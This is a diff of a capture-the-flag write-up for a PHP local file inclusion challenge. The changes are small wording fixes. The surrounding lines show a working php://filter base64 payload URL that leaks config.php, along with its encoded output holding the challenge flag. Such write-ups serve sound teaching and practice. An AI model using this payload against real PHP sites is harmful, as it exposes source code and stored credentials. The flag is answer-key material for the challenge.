@@ -25,14 +25,14 @@ It directly gives user input to ```require```.
 
 https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
 
-If we just give the file name the php in it will be executed.
+We can make the server require config.php, but the php in it will be executed.
 
 To prevent that we can use ```php://filter/convert.base64-encode/resource=config.php```.
 ```
 https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
 ```
 
-This base64 string will at the top of the page:
+This base64 string will be at the top of the page:
 ```
 PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==
 ```
